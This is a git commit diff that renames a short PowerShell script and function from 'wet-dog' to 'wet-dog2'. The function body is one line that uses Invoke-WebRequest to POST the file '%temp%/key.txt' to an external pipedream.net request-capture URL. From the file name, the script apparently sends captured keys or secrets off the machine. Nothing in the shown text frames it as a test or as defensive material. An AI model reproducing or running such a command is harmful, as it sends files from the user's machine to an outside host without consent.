48bb7e6e2bb9bda34c2ec8fe84e5d005460452f5
logsandstuff <59518250+logsandstuff@users.noreply.github.com>
2020-01-05 19:33:01 -0800

    Update and rename wet-dog.ps1 to wet-dog2.ps1

--- wet-dog2.ps1
+++ wet-dog2.ps1
@@ -1,3 +1,3 @@
-function wet-dog {
+function wet-dog2 {
   \npowershell Invoke-WebRequest -Url https://en0501ny223ikh.x.pipedream.net/ -Method POST -ContentType 'text/plain'-InFile '%temp%/key.txt'
 }
